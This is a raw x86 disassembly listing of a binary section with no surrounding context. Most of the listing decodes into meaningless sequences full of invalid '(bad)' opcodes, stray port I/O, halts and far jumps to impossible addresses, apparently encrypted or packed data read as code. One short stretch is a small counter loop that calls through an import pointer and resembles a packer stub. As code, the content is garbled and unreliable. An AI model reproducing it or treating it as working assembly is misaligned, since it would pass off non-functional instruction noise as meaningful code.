  406754:	inc    esp
  406755:	imul   esp,DWORD PTR [esi+0x4d81dbea],0xd24bf588
  40675f:	lods   al,BYTE PTR ds:[esi]
  406760:	aad    0x10
  406762:	mov    ebp,DWORD PTR [edx-0xcb5c28f]
  406768:	push   es
  406769:	cmp    al,0x5b
  40676b:	push   eax
  40676c:	out    dx,al
  40676d:	fisub  DWORD PTR [ecx-0x19]
  406770:	mov    cl,0x4
  406772:	repz or BYTE PTR [esi+0x2b4e49c3],0x0
  40677a:	push   ecx
  40677b:	jo     0x4067b1
  40677d:	(bad)  
  40677e:	je     0x406738
  406780:	push   ebx
  406781:	xchg   ebx,eax
  406782:	fistp  QWORD PTR [eax-0x3c6409aa]
  406788:	jg     0x406764
  40678a:	js     0x406780
  40678c:	into   
  40678d:	mov    esi,0x3fb12855
  406792:	and    BYTE PTR [ecx+edi*4+0x3a],dh
  406796:	sub    ebx,DWORD PTR [eax+0x8405744]
  40679c:	fdivr  st(0),st
  40679e:	adc    ah,BYTE PTR [ebx-0x78047ff0]
  4067a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4067a5:	int    0x6b
  4067a7:	fcmovu st,st(1)
  4067a9:	xchg   BYTE PTR [ecx+0x23],bl
  4067ac:	mov    ebp,0x7a898461
  4067b1:	and    DWORD PTR [ebx+0x3d],edi
  4067b4:	jp     0x4067fc
  4067b6:	push   edx
  4067b7:	jo     0x4067db
  4067b9:	mov    cl,0xf7
  4067bb:	sbb    dh,BYTE PTR [esi+0x4ee30673]
  4067c1:	cmp    BYTE PTR ds:0x3ef4754e,bl
  4067c7:	xor    al,0xe4
  4067c9:	hlt    
  4067ca:	inc    eax
  4067cb:	pop    esp
  4067cc:	push   esp
  4067cd:	dec    esp
  4067ce:	and    DWORD PTR [ecx-0x39102998],ebp
  4067d4:	xchg   edx,eax
  4067d5:	adc    DWORD PTR [ebx+0x28637ccb],eax
  4067db:	mov    cl,0x62
  4067dd:	push   ebx
  4067de:	mov    ebx,0x65e3b6bb
  4067e3:	out    dx,al
  4067e4:	les    esi,FWORD PTR [edi]
  4067e6:	repz mov ds:0x210fb8fe,eax
  4067ec:	jns    0x406824
  4067ee:	cmp    edi,DWORD PTR [esi-0x12]
  4067f1:	adc    DWORD PTR [edi+eax*1-0x48],edi
  4067f5:	jb     0x4067f4
  4067f7:	repz into 
  4067f9:	dec    esp
  4067fa:	arpl   WORD PTR [ecx],bp
  4067fc:	and    eax,0x6004af83
  406801:	jbe    0x4067ba
  406803:	fst    QWORD PTR [edi]
  406805:	or     BYTE PTR [ebp-0x77],dh
  406808:	cld    
  406809:	call   0xe2ad0c15
  40680e:	add    BYTE PTR [esi+0x35275531],bh
  406814:	stc    
  406815:	pop    edi
  406816:	push   0x60
  406818:	mov    al,0xa8
  40681a:	test   DWORD PTR [ebp+eax*4+0x40],ebx
  40681e:	push   eax
  40681f:	inc    ebx
  406820:	hlt    
  406821:	or     eax,0xfdfc1acb
  406826:	mov    bh,0x1e
  406828:	push   ebx
  406829:	into   
  40682a:	add    al,0xbb
  40682c:	mov    bh,BYTE PTR [ebx+0x45]
  40682f:	or     al,bh
  406831:	hlt    
  406832:	sar    BYTE PTR [ecx],1
  406834:	jecxz  0x40685e
  406836:	outs   dx,DWORD PTR ds:[esi]
  406837:	or     al,0xe8
  406839:	or     eax,0xc346c278
  40683e:	cmp    WORD PTR [edx],0x6b62
  406843:	loop   0x406808
  406845:	mov    WORD PTR [edi+0x59cc838c],es
  40684b:	dec    esp
  40684c:	fist   DWORD PTR [ecx+0x7d]
  40684f:	stos   BYTE PTR es:[edi],al
  406850:	inc    edi
  406851:	retf   
  406852:	xlat   BYTE PTR ds:[ebx]
  406853:	ds dec edi
  406855:	or     ebx,edx
  406857:	mov    ds:0xb3b9a413,al
  40685c:	hlt    
  40685d:	xor    eax,0xb558f30c
  406862:	xlat   BYTE PTR ds:[ebx]
  406863:	push   edi
  406864:	ja     0x406897
  406866:	jmp    0x40680d
  406868:	(bad)  
  406869:	xchg   edx,eax
  40686a:	mov    ds,WORD PTR [edx+0x43303ed0]
  406870:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406871:	pop    ebx
  406872:	adc    DWORD PTR [ecx+0x1b],0x60
  406876:	cmp    ah,ch
  406878:	ror    bh,0x71
  40687b:	pop    edx
  40687c:	mov    ebx,0xd688a96a
  406881:	mov    WORD PTR [esp+ebx*8+0x68],?
  406885:	adc    al,0x10
  406887:	sbb    DWORD PTR [esi-0x17],ebp
  40688a:	mov    dh,dh
  40688c:	test   BYTE PTR [ebx],bh
  40688e:	idiv   esp
  406890:	mov    al,ds:0x604b6de6
  406895:	adc    al,0x58
  406897:	mov    esp,0xa47b2a36
  40689c:	aas    
  40689d:	outs   dx,BYTE PTR ds:[esi]
  40689e:	adc    bh,BYTE PTR [edi+0x1b4be0e3]
  4068a4:	cmp    ecx,DWORD PTR [ebx]
  4068a6:	outs   dx,BYTE PTR ds:[esi]
  4068a7:	mov    bh,0x65
  4068a9:	dec    ecx
  4068aa:	fcmovnbe st,st(0)
  4068ac:	dec    eax
  4068ad:	push   es
  4068ae:	int3   
  4068af:	mov    esi,0xfb3ab58a
  4068b4:	sar    bh,0x24
  4068b7:	adc    dh,cl
  4068b9:	imul   ebx,DWORD PTR [eax-0x481aa25],0xfffffffd
  4068c0:	out    0xee,eax
  4068c2:	leave  
  4068c3:	aas    
  4068c4:	int3   
  4068c5:	adc    bl,ah
  4068c7:	mov    ah,0xbe
  4068c9:	mov    bl,0xa2
  4068cb:	or     al,0x99
  4068cd:	ret    0xaf3f
  4068d0:	jns    0x406948
  4068d2:	and    esp,DWORD PTR [ebp+0x18c25d]
  4068d8:	push   ebp
  4068d9:	mov    ebp,esp
  4068db:	sub    esp,0x58
  4068de:	mov    DWORD PTR ds:0x42aa1d,0x1f
  4068e8:	cmp    DWORD PTR ds:0x42aa1d,0x0
  4068ef:	je     0x406947
  4068f5:	cmp    DWORD PTR ds:0x42aa1d,0x8
  4068fc:	jne    0x406916
  406902:	push   DWORD PTR [ebp-0x1c]
  406905:	push   DWORD PTR [ebp-0x24]
  406908:	push   0x42ad0a
  40690d:	push   DWORD PTR [ebp-0x10]
  406910:	call   DWORD PTR ds:0x41d18c
  406916:	cmp    DWORD PTR ds:0x42aa1d,0x9
  40691d:	jne    0x406931
  406923:	xor    eax,eax
  406925:	or     eax,DWORD PTR ds:0x42aa1d
  40692b:	dec    eax
  40692c:	mov    ds:0x42aa1d,eax
  406931:	mov    eax,ds:0x42aa1d
  406936:	dec    eax
  406937:	mov    ds:0x42aa1d,eax
  40693c:	jmp    0x4068e8
  406941:	and    DWORD PTR ds:0x42a9c9,edx
  406947:	mov    ecx,DWORD PTR [ebp+0x8]
  40694a:	jmp    0x406c53
  40694f:	int3   
  406950:	(bad)
  406953:	(bad)  
  406955:	fcmove st,st(1)
  406957:	in     eax,dx
  406958:	loop   0x406947
  40695a:	out    dx,eax
  40695b:	ja     0x4069ba
  40695d:	sti    
  40695e:	cdq    
  40695f:	add    cl,cl
  406961:	js     0x4069db
  406963:	fs jle 0x4069de
  406966:	js     0x406982
  406968:	retf   0x845d
  40696b:	mov    BYTE PTR [ebp-0x80],ch
  40696e:	sbb    DWORD PTR [eax],edx
  406970:	jle    0x4069c7
  406972:	iret   
  406973:	add    bh,ah
  406975:	repz and BYTE PTR [edx],0x97
  406979:	and    ecx,DWORD PTR [esi+0x5e]
  40697c:	jmp    0xca66ee0a
  406981:	push   ebp
  406982:	(bad)  
  406983:	push   0x8
  406985:	hlt    
  406986:	lock xor esi,DWORD PTR [ecx]
  406989:	push   0xa7287d7e
  40698e:	scas   al,BYTE PTR es:[edi]
  40698f:	jg     0x40695a
  406991:	mov    al,ds:0x6e7bff06
  406996:	into   
  406997:	es int3 
  406999:	inc    eax
  40699a:	jno    0x406a03
  40699c:	push   ebp
  40699d:	jae    0x4069fd
  40699f:	in     eax,dx
  4069a0:	xor    eax,0x3f36f2a4
  4069a5:	cli    
  4069a6:	mov    edx,0x9468de0b
  4069ab:	and    dh,bl
  4069ad:	sahf   
  4069ae:	inc    edx
  4069af:	cwde   
  4069b0:	aaa    
  4069b1:	cmc    
  4069b2:	neg    BYTE PTR [ebx-0x63]
  4069b5:	xchg   ecx,eax
  4069b6:	and    eax,DWORD PTR [esi+0x118934e6]
  4069bc:	sbb    ebp,eax
  4069be:	and    al,0x46
  4069c0:	adc    edi,DWORD PTR [edx+0x36636ad1]
  4069c6:	fisub  WORD PTR [ebp-0x3f23f4fc]
  4069cc:	stc    
  4069cd:	xchg   BYTE PTR [edi+ecx*4-0x70],ch
  4069d1:	jne    0x406988
  4069d3:	push   0xccee2e48
  4069d8:	pushf  
  4069d9:	ins    DWORD PTR es:[edi],dx
  4069da:	cmp    eax,ebp
  4069dc:	cwde   
  4069dd:	mov    dh,0x96
  4069df:	adc    al,0x5d
  4069e1:	call   FWORD PTR [ebp-0x1cf08097]
  4069e7:	push   esi
  4069e8:	xchg   ecx,eax
  4069e9:	leave  
  4069ea:	sbb    dl,dh
  4069ec:	lock jg 0x406999
  4069ef:	imul   esp,DWORD PTR [ebx+0x8],0x1c
  4069f3:	int    0xd3
  4069f5:	pop    edx
  4069f6:	pop    ebx
  4069f7:	or     BYTE PTR [ebp+0x47],ah
  4069fa:	imul   esp,DWORD PTR ds:0x96e7bb92,0xffffffd1
  406a01:	jb     0x4069af
  406a03:	cmc    
  406a04:	xor    DWORD PTR [ecx],ecx
  406a06:	imul   eax
  406a08:	push   0xffffffcf
  406a0a:	int    0xaa
  406a0c:	jl     0x406a52
  406a0e:	inc    edi
  406a0f:	pop    edi
  406a10:	mov    edi,0x563f844
  406a15:	stos   BYTE PTR es:[edi],al
  406a16:	xchg   DWORD PTR [eax-0x214c5336],edx
  406a1c:	mov    ds:0xe9759eea,al
  406a21:	pop    ss
  406a22:	sar    BYTE PTR [ebx+ebx*2],cl
  406a25:	inc    edx
  406a26:	mov    edi,0x37b12414
  406a2b:	into   
  406a2c:	push   edx
  406a2d:	fbld   TBYTE PTR [edi+eiz*1]
  406a30:	pop    esi
  406a31:	fisub  DWORD PTR [ecx+0x7a03585b]
  406a37:	ds push esi
  406a39:	hlt    
  406a3a:	dec    edi
  406a3b:	jae    0x406a31
  406a3d:	stos   BYTE PTR es:[edi],al
  406a3e:	fdiv   QWORD PTR cs:[ebx+0x1b]
  406a42:	xor    edx,edx
  406a44:	inc    esi
  406a45:	xor    ecx,DWORD PTR [eax+0x69]
  406a48:	(bad)
  406a4b:	jge    0x4069cf
  406a4d:	lods   eax,DWORD PTR ds:[esi]
  406a4e:	int3   
  406a4f:	out    0x42,eax
  406a51:	jg     0x406ad1
  406a53:	sbb    ebx,ebx
  406a55:	call   0x7021:0x2ab25dc0
  406a5c:	js     0x406ab9
  406a5e:	fist   WORD PTR [ebx]
  406a60:	mov    edi,0x7faaf08d
  406a65:	sub    cl,BYTE PTR [esi]
  406a67:	int3   
  406a68:	into   
  406a69:	adc    DWORD PTR [eax-0x49],0x3f0eceaa
  406a70:	push   ds
  406a71:	aam    0x7b
  406a73:	inc    edx
  406a74:	and    ebp,DWORD PTR [edi+0x28b54b4b]
  406a7a:	scas   al,BYTE PTR es:[edi]
  406a7b:	mov    edi,0x74413b5d
  406a80:	adc    bl,BYTE PTR ds:0xf0857cf
  406a86:	pop    esi
  406a87:	js     0x406acc
  406a89:	lods   eax,DWORD PTR ds:[esi]
  406a8a:	lods   al,BYTE PTR ds:[esi]
  406a8b:	mov    DWORD PTR [ebp+0xc],esi
  406a8e:	adc    al,0xbc
  406a90:	pop    ebp
  406a91:	(bad)  
  406a93:	and    al,0x63
  406a95:	scas   al,BYTE PTR es:[edi]
  406a96:	adc    DWORD PTR [edi-0x68650a29],ebx
  406a9c:	xchg   edx,eax
  406a9d:	clc    
  406a9e:	sub    al,0x93
  406aa0:	bound  edx,QWORD PTR [esi]
  406aa2:	and    BYTE PTR [edi+0x48],bl
  406aa5:	js     0x406add
  406aa7:	repnz mov edx,0x1d8ad1c8
  406aad:	fisubr WORD PTR [eax-0x1c]
  406ab0:	cmp    al,0x28
  406ab2:	shl    BYTE PTR [edx-0x2e],cl
  406ab5:	das    
  406ab6:	repz cli 
  406ab8:	es retf 0x2523
  406abc:	mov    ebx,0xd39fc9c2
  406ac1:	inc    esp
  406ac2:	push   eax
  406ac3:	mov    ds:0x113dbd7a,al
  406ac8:	cld    
  406ac9:	mov    esp,0x2548d7d3
  406ace:	in     al,0x21
  406ad0:	or     dl,bh
  406ad2:	and    ch,ch
  406ad4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406ad5:	lock xchg esp,eax
  406ad7:	push   ss
  406ad8:	adc    eax,0x7bbe2cd1
  406add:	out    0xd3,al
  406adf:	add    ecx,DWORD PTR [edx+0x24abd982]
  406ae5:	ret    0xec81
  406ae8:	inc    esp
  406ae9:	xchg   BYTE PTR [ebx],al
  406aeb:	adc    dl,cl
  406aed:	jne    0x406ade
  406aef:	hlt    
  406af0:	and    DWORD PTR [edi-0x30d6a1e3],esi
  406af6:	fsubr  st,st(2)
  406af8:	add    esp,DWORD PTR [ebx+0x78766df3]
  406afe:	inc    esi
  406aff:	jle    0x57dd8dfd
  406b05:	pop    ss
  406b06:	add    ch,ah
  406b08:	sub    esp,edi
  406b0a:	ror    BYTE PTR [ecx+0x69a1e3c5],0x5b
  406b11:	push   ss
  406b12:	outs   dx,DWORD PTR ds:[esi]
  406b13:	add    al,0x74
  406b15:	gs fs out dx,eax
  406b18:	hlt    
  406b19:	mov    ?,WORD PTR [eax]
  406b1b:	push   0x1a
  406b1d:	sbb    BYTE PTR [ebx],0xf
  406b20:	cs in  eax,dx
  406b22:	(bad)  
  406b23:	in     eax,dx
  406b24:	pop    edx
  406b25:	sub    DWORD PTR [edx+eax*8+0x25],esp
  406b29:	sub    DWORD PTR [esi+0x69],ebp
  406b2c:	dec    esi
  406b2d:	lock push es
  406b2f:	(bad)  
  406b31:	sub    bl,BYTE PTR [ebx-0xe]
  406b34:	push   0xc1a9e5dc
  406b39:	(bad)  
  406b3a:	mov    esi,0xcf748a3a
  406b3f:	add    al,0x6
  406b41:	cld    
  406b42:	inc    esi
  406b43:	int3   
  406b44:	ins    DWORD PTR es:[edi],dx
  406b45:	push   0xe2c92d6e
  406b4a:	mov    bh,0x1d
  406b4c:	jbe    0x406ad9
  406b4e:	out    0xb9,al
  406b50:	sbb    eax,0x99d2ae4b
  406b55:	cs jmp 0xdd2d:0x7aefd6df
  406b5d:	mov    ds:0x5aadf4c6,al
  406b62:	inc    edx
  406b63:	mov    ebp,0xc7187dc8
  406b68:	out    0xce,al
  406b6a:	sar    BYTE PTR [ecx+0x3475ac1c],0x52
  406b71:	xor    BYTE PTR [eax+ebp*8+0x1ae77374],al
  406b78:	por    mm1,mm6
  406b7b:	int3   
  406b7c:	(bad)  
  406b7d:	test   DWORD PTR [edx+0x15],0x65e9fd7d
  406b84:	ins    BYTE PTR es:[edi],dx
  406b85:	sbb    al,BYTE PTR [edx]
  406b87:	repnz enter 0xd3c8,0x9b
  406b8c:	sub    dh,al
  406b8e:	sub    eax,0x427ee69d
  406b93:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406b94:	and    BYTE PTR [esi+eax*1+0x1b2bbf68],0x84
  406b9c:	cmp    al,0xbe
  406b9e:	ror    dl,0xed
  406ba1:	loopne 0x406b89
  406ba3:	push   esp
  406ba4:	pop    ebp
  406ba5:	ins    BYTE PTR es:[edi],dx
  406ba6:	jno    0x406b8a
  406ba8:	test   al,0x19
  406baa:	xchg   edi,eax
  406bab:	mov    bh,0x1f
  406bad:	sub    edi,DWORD PTR [edx]
  406baf:	add    cl,dl
  406bb1:	retf   0xc2eb
  406bb4:	or     edx,esp
  406bb6:	inc    ecx
  406bb7:	adc    BYTE PTR [eax-0x1945db6c],dh
  406bbd:	jmp    0x406b7e
  406bbf:	fiadd  WORD PTR [eax+0x19]
  406bc2:	stos   BYTE PTR es:[edi],al
  406bc3:	data16 aas 
  406bc5:	mov    bl,0x4a
  406bc7:	or     edi,DWORD PTR [edx+0x26]
  406bca:	or     eax,esi
  406bcc:	test   DWORD PTR [esi],esi
  406bce:	idiv   BYTE PTR [eax]
  406bd0:	xor    DWORD PTR [ebx+0x31],edi
  406bd3:	loopne 0x406bec
  406bd5:	mov    dh,0x21
  406bd7:	out    0x21,al
  406bd9:	in     eax,0xc6
  406bdb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406bdc:	icebp  
  406bdd:	jge    0x406bf3
  406bdf:	fmul   DWORD PTR [edx-0x4d06dcb9]
  406be5:	add    eax,0x1339125d
  406bea:	sub    DWORD PTR [edi],ecx
  406bec:	lock jmp 0xa29a3682
  406bf2:	stos   BYTE PTR es:[edi],al
  406bf3:	jmp    0x406b81
  406bf5:	push   ecx
  406bf6:	adc    BYTE PTR [edx-0x29],dh
  406bf9:	aaa    
  406bfa:	xor    edx,edi
  406bfc:	cli    
  406bfd:	lds    eax,FWORD PTR [edi]
  406bff:	mov    eax,0x1432eb00
  406c04:	push   esi
  406c05:	sub    edx,DWORD PTR [ebx]
  406c07:	fdivr  st,st(3)
  406c09:	les    eax,FWORD PTR [edi]
  406c0b:	js     0x406ba0
  406c0d:	mov    esi,0x2df09e23
  406c12:	sub    al,BYTE PTR [edi-0x3fd222d8]
  406c18:	cdq    
  406c19:	enter  0x8111,0x78
  406c1d:	cld    
  406c1e:	lds    ebx,FWORD PTR [eax-0x5c]
  406c21:	inc    edi
  406c22:	cmp    ebp,DWORD PTR [ebx-0x3a]
  406c25:	inc    esi
  406c26:	jo     0x406c80
  406c28:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406c29:	imul   edx,DWORD PTR cs:[edx],0xb9c03c26
  406c30:	push   es
  406c31:	leave  
  406c32:	(bad)  
  406c34:	daa    
  406c35:	popf   
  406c36:	add    DWORD PTR [eax],edx
  406c38:	(bad)  
  406c39:	jmp    0x406c29
  406c3b:	xchg   esp,eax
  406c3c:	lahf   
  406c3d:	pop    edi
  406c3e:	je     0x406c02
  406c40:	push   cs
  406c41:	xor    ch,ah
  406c43:	sub    DWORD PTR [edi+eiz*2-0x6],edi
  406c47:	add    edi,eax
  406c49:	sub    edi,esi
  406c4b:	pop    edx
  406c4c:	popf   
  406c4d:	add    eax,0xddc24148
  406c52:	imul   edi,DWORD PTR [eax+0x8a36],0xaa291581
  406c5c:	inc    edx
  406c5d:	add    dl,ch
  406c5f:	dec    edi
  406c60:	add    BYTE PTR [eax],al
  406c62:	xor    ax,WORD PTR [ecx+0x20]
  406c66:	sub    DWORD PTR ds:0x42aa55,0x417a
  406c70:	mov    ecx,0x3afc
  406c75:	xor    DWORD PTR ds:0x42aaad,0x2c9d
  406c7f:	jmp    0x406f88
  406c84:	rol    dh,cl
  406c86:	cmp    al,0xd3
  406c88:	aam    0xd9
  406c8a:	rol    ebp,1
  406c8c:	mov    eax,ebx
  406c8e:	and    DWORD PTR [ecx-0x32],ebx
  406c91:	sbb    al,0xf8
  406c93:	push   es
  406c94:	ins    BYTE PTR es:[edi],dx
  406c95:	iret   
  406c96:	js     0x406d10
  406c98:	fs jle 0x406d13
  406c9b:	js     0x406cf8
  406c9d:	cmp    eax,0x2dcfeeb
  406ca2:	out    0x2f,al
  406ca4:	and    al,0x7e
  406ca6:	cmp    BYTE PTR [edx-0x721f1288],cl
  406cac:	xchg   edx,eax
  406cad:	mov    dl,0xd8
  406caf:	outs   dx,BYTE PTR ds:[esi]
  406cb0:	jge    0x406cb2
  406cb2:	into   
  406cb3:	je     0x406cf2
  406cb5:	or     DWORD PTR [ecx],esp
  406cb7:	adc    cl,BYTE PTR [esi-0x5]
  406cba:	xchg   edi,eax
  406cbb:	out    dx,eax
  406cbc:	out    0x1d,eax
  406cbe:	loop   0x406c45
  406cc0:	push   cs
  406cc1:	(bad)  
  406cc2:	mov    eax,ds:0x878dc520
  406cc7:	cmovb  eax,ebx
  406cca:	test   bl,dl
  406ccc:	neg    esp
  406cce:	outs   dx,BYTE PTR ds:[esi]
  406ccf:	jp     0x406ce8
  406cd1:	xchg   ecx,eax
  406cd2:	cmp    eax,DWORD PTR [eax-0x43]
  406cd5:	add    al,0x3e
  406cd7:	daa    
  406cd8:	mov    esp,esp
  406cda:	sbb    bh,bl
  406cdc:	xchg   esp,eax
  406cdd:	pop    es
  406cde:	or     al,0x39
  406ce0:	mov    al,0x74
  406ce2:	or     ah,bl
  406ce4:	jbe    0x406d32
  406ce6:	or     ebp,DWORD PTR [eax-0x18]
  406ce9:	loopne 0x406cce
  406ceb:	and    ah,BYTE PTR [ebx]
  406ced:	push   edx
  406cee:	adc    esp,DWORD PTR [edx+eax*2+0x57]
  406cf2:	imul   ebp,edx,0x54
  406cf5:	fs jmp 0xc3283797
  406cfb:	stos   DWORD PTR es:[edi],eax
  406cfc:	mov    ebp,0x66dbf274
  406d01:	jge    0x406d2a
  406d03:	mov    esi,0xb2a7fd62
  406d08:	ret    
  406d09:	ror    bh,cl
  406d0b:	sub    ch,BYTE PTR [ebx-0x40]
  406d0e:	jle    0x406d84
  406d10:	cmp    eax,0x74d4fa18
  406d15:	or     eax,0xf9a037b2
  406d1a:	pop    edx
  406d1b:	lods   eax,DWORD PTR ds:[esi]
  406d1c:	repnz push ds
  406d1e:	aad    0xad
  406d20:	jmp    0x1856:0xbbb10efe
  406d27:	inc    ecx
  406d28:	jbe    0x406d45
  406d2a:	addr16 add bl,dl
  406d2d:	lods   eax,DWORD PTR ds:[esi]
  406d2e:	mov    edx,0xe056675e
  406d33:	aas    
  406d34:	jns    0x406cfb
  406d36:	(bad)  
  406d38:	mov    ds:0xd1603363,eax
  406d3d:	outs   dx,BYTE PTR ds:[esi]
  406d3e:	dec    ebx
  406d3f:	xor    BYTE PTR [edx+ebp*2],al
  406d42:	xchg   esp,eax
  406d43:	jle    0x406d90
  406d45:	aaa    
  406d46:	jg     0x406d4f
  406d48:	mov    eax,0x7b4e3252
  406d4d:	rol    ebp,0x16
  406d50:	(bad)  
  406d51:	call   0xbd6d:0xb61ce4f9
  406d58:	push   es
  406d59:	(bad)  [edi-0x22]
  406d5c:	and    al,0x31
  406d5e:	mov    edi,0xea63c88e
  406d63:	xchg   BYTE PTR [eax-0x5943abc8],cl
  406d69:	mov    ebp,0xc7565e92
  406d6e:	and    al,ah
  406d70:	repnz add bh,BYTE PTR [ebx]
  406d73:	shl    edx,cl
  406d75:	js     0x406d3c
  406d77:	int    0x8f
  406d79:	stc    
  406d7a:	retf   0x97f4
  406d7d:	fs mov ch,0x96
  406d80:	imul   DWORD PTR [ebx+0x68389e3a]
  406d86:	or     al,0xab
  406d88:	not    BYTE PTR [eax]
  406d8a:	mov    edx,0xbf883e68
  406d8f:	dec    ecx
  406d90:	aaa    
  406d91:	cdq    
  406d92:	data16 and al,0x71
  406d95:	cmc    
  406d96:	mov    esi,0x585ba123
  406d9b:	add    al,0x65
  406d9d:	dec    eax
  406d9e:	or     dl,BYTE PTR [ebp+0x6d]
  406da1:	test   al,0x81
  406da3:	mov    ds:0x29c9ebf2,eax
  406da8:	cwde   
  406da9:	call   0x805a:0x6f310116
  406db0:	into   
  406db1:	shl    BYTE PTR [edx+0x7b],1
  406db4:	shr    eax,0x8e
  406db7:	gs xchg edx,eax
  406db9:	jnp    0x406dc6
  406dbb:	or     cl,BYTE PTR [edx]
  406dbd:	(bad)  
  406dbe:	mov    ch,BYTE PTR [edi+0x5c]
  406dc1:	out    0xa0,eax
  406dc3:	out    dx,eax
  406dc4:	pop    ebp
  406dc5:	aam    0x90
  406dc7:	mov    ebp,0xf26fc37f
  406dcc:	test   eax,0x4a54df56
  406dd1:	lahf   
  406dd2:	sbb    ah,cl
  406dd4:	jae    0x406da0
  406dd6:	iret   
  406dd7:	add    al,0xe0
  406dd9:	cdq    
  406dda:	jo     0x406dd0
  406ddc:	jge    0x406d71
  406dde:	aaa    
  406ddf:	loop   0x406dc4
  406de1:	pop    ss
  406de2:	je     0x406d79
  406de4:	mov    es,WORD PTR [edi-0x3e]
  406de7:	jecxz  0x406e2d
  406de9:	call   0xc996:0xbd3f36ec
  406df0:	iret   
  406df1:	mov    ch,0x4d
  406df3:	cmp    BYTE PTR [esi],ah
  406df5:	outs   dx,DWORD PTR ds:[esi]
  406df6:	sti    
  406df7:	jae    0x406da6
  406df9:	xchg   ecx,eax
  406dfa:	and    BYTE PTR [ecx+0x7a],bh
  406dfd:	mov    eax,0xadc99c21
  406e02:	inc    edx
  406e03:	add    BYTE PTR [ebp+0x6b],dl
  406e06:	add    ah,BYTE PTR [ebx-0x4f]
  406e09:	sub    esp,eax
  406e0b:	es xor bl,0x54
  406e0f:	mov    esi,0xd679dab8
  406e14:	dec    ecx
  406e15:	mov    ecx,0xf09006f8
  406e1a:	push   0xffffffe6
  406e1c:	sbb    al,0xab
  406e1f:	dec    eax
  406e20:	aad    0x30
  406e22:	push   0xc96abcac
  406e27:	js     0x406dd9
  406e29:	rcr    DWORD PTR [ecx+0x67061851],0xcd
  406e30:	xor    esp,DWORD PTR [esi]
  406e32:	pop    esi
  406e33:	not    DWORD PTR [eax+0xd]
  406e36:	fdiv   QWORD PTR [eax-0x33ad9aed]
  406e3c:	cmc    
  406e3d:	pop    edx
  406e3e:	push   esp
  406e3f:	mov    bl,0x4
  406e41:	or     al,0x50
  406e43:	ds mov dh,0xd8
  406e46:	sub    al,0xc
  406e48:	imul   edi,edi,0xe811c3a
  406e4e:	inc    edx
  406e4f:	inc    eax
  406e50:	cmp    DWORD PTR [edi-0x5],ecx
  406e53:	in     eax,dx
  406e54:	popf   
  406e55:	push   ds
  406e56:	cmc    
  406e57:	mov    ds:0xfe01581,eax
  406e5c:	stos   DWORD PTR es:[edi],eax
  406e5d:	clc    
  406e5e:	mov    dl,0x72
  406e60:	xchg   ebx,eax
  406e61:	shl    ah,0x8d
  406e64:	pusha  
  406e65:	cld    
  406e66:	dec    edi
  406e67:	or     ch,BYTE PTR [esi]
  406e69:	mov    eax,esi
  406e6b:	and    eax,0xe16dd180
  406e70:	test   DWORD PTR [edx-0x5b6745b3],ebx
  406e76:	sub    al,0xdb
  406e78:	xchg   edi,eax
  406e79:	ror    DWORD PTR [ebp+ecx*2-0x5c207f45],1
  406e80:	sbb    al,0xdf
  406e82:	push   esi
  406e83:	and    al,0x9b
  406e85:	out    dx,eax
  406e86:	mov    edx,0x4f62afde
  406e8b:	adc    BYTE PTR [esi],ch
  406e8d:	push   edi
  406e8e:	lock (bad) 
  406e91:	jmp    0xae48:0xd1e40924
  406e98:	cs push eax
  406e9a:	scas   eax,DWORD PTR es:[edi]
  406e9b:	add    ebx,ebp
  406e9d:	sbb    al,0xf1
  406e9f:	jnp    0x406eef
  406ea1:	pop    ebx
  406ea2:	mov    al,ds:0x92614445
  406ea7:	scas   eax,DWORD PTR es:[edi]
  406ea8:	cmp    esp,DWORD PTR [edx+0xd]
  406eab:	xchg   edx,eax
  406eac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406ead:	popf   
  406eae:	ins    DWORD PTR es:[edi],dx
  406eaf:	iret   
  406eb0:	lods   al,BYTE PTR ds:[esi]
  406eb1:	dec    eax
  406eb2:	aad    0x1
  406eb4:	and    bh,0xff
  406eb7:	adc    al,0x0
  406eb9:	popf   
  406eba:	push   ss
  406ebb:	or     DWORD PTR [eax+0x4e],edx
  406ebe:	xor    eax,0x794ceff2
  406ec3:	pop    ds
  406ec4:	sbb    ebx,DWORD PTR [ebp-0x38]
  406ec7:	stc    
  406ec8:	sub    al,0x29
  406eca:	sbb    bh,BYTE PTR [edi]
  406ecc:	sbb    esp,DWORD PTR [ecx+ecx*8]
  406ecf:	dec    ebp
  406ed0:	mov    ah,0x89
  406ed2:	xchg   edx,eax
  406ed3:	dec    edi
  406ed4:	mov    fs,eax
  406ed6:	pop    esp
  406ed7:	push   edi
  406ed8:	pop    ebx
  406ed9:	xlat   BYTE PTR ds:[ebx]
  406eda:	fs mov ebp,0xae6f76fe
  406ee0:	xor    al,0xfb
  406ee2:	and    eax,0x21cef4c7
  406ee7:	int    0x62
  406ee9:	shl    BYTE PTR ds:0x38a66de7,cl
  406eef:	cmp    esi,0x57
  406ef2:	call   0x6e74:0x5c32ee96
  406ef9:	mov    cl,0xe
  406efb:	dec    eax
  406efc:	shl    DWORD PTR [edx-0x2f],0x64
  406f00:	jno    0x406e94
  406f02:	add    BYTE PTR [esi+0x6342ffe6],bl
  406f08:	idiv   DWORD PTR [eax-0x3b918ced]
  406f0e:	(bad)  
  406f0f:	xor    DWORD PTR [esp+ebx*8],edx
  406f12:	mov    DWORD PTR [esi+eax*4+0x39c5d1ea],0x40c6bea5
  406f1d:	scas   eax,DWORD PTR es:[edi]
  406f1e:	hlt    
  406f1f:	mov    ds:0xc1d04948,eax
  406f24:	fwait
  406f25:	cmc    
  406f26:	(bad)  
  406f28:	xor    eax,0x6156eda
  406f2d:	and    dl,BYTE PTR [ebx-0x80]
  406f30:	ins    BYTE PTR es:[edi],dx
  406f31:	push   eax
  406f32:	mov    ecx,0x7d1cfbc7
  406f37:	mov    fs,WORD PTR [eax]
  406f39:	inc    esp
  406f3a:	mov    dl,0x81
  406f3c:	hlt    
  406f3d:	dec    esi
  406f3e:	hlt    
  406f3f:	or     ch,0xba
  406f42:	repnz or eax,0x9189f65a
  406f48:	mov    dh,0xa
  406f4a:	mov    dh,BYTE PTR [edx]
  406f4c:	pop    esi
  406f4d:	jb     0x406fba
  406f4f:	(bad)  
  406f50:	adc    al,0x73
  406f52:	xor    DWORD PTR [esi+0x1a014f8b],ebx
